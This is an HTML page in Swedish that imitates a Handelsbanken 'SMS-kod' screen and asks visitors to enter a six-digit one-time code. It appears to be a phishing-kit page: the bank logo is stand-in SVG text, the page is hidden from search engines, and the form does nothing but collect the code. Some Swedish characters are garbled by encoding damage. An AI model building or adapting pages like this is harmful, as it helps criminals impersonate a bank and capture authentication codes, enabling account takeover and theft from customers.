<!DOCTYPE html>
<html lang="sv"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>SMS-kod - Handelsbanken</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
        }
        .container-wrapper {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        header {
            background: #005fa5;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .logo {
            width: 200px;
            height: auto;
            margin: 0 auto 10px;
            display: block;
        }
        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }
        .content {
            max-width: 500px;
            width: 100%;
            background: white;
            border-radius: 8px;
            padding: 40px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 18px;
            text-align: center;
            letter-spacing: 4px;
        }
        .button {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            background: #005fa5;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .button:hover {
            background: #004a85;
        }
    </style>
</head>
<body>
    <div class="container-wrapper">
        <header>
            <div class="logo">
                <svg viewBox="0 0 200 40" style="width: 200px; height: 40px;" fill="white">
                    <text x="10" y="25" font-size="20" font-weight="bold">Handelsbanken</text>
                </svg>
            </div>
            <div style="font-size: 14px; margin-top: 10px;">SMS-kod</div>
        </header>
        <main>
            <div class="content">
                <h1 style="font-size: 24px; margin-bottom: 20px; color: #333;">SMS-kod</h1>
                <p style="font-size: 16px; color: #666; margin-bottom: 30px;">Vi har skickat SMS-koden till din telefon. Ange koden i f채ltet nedan och tryck p책 knappen Forts채tt.</p>
                <form id="sms-form" autocomplete="off">
                    <div class="form-group">
                        <label for="sms-code">SMS-kod</label>
                        <input id="sms-code" type="text" name="sms_code" maxlength="6" autocomplete="off" aria-required="true" value="" inputmode="numeric" placeholder="123456">
                    </div>
                    <button type="submit" class="button" id="smsSubmitButton">Forts채tt</button>
                </form>
            </div>
        </main>
    </div>
</body>
</html>
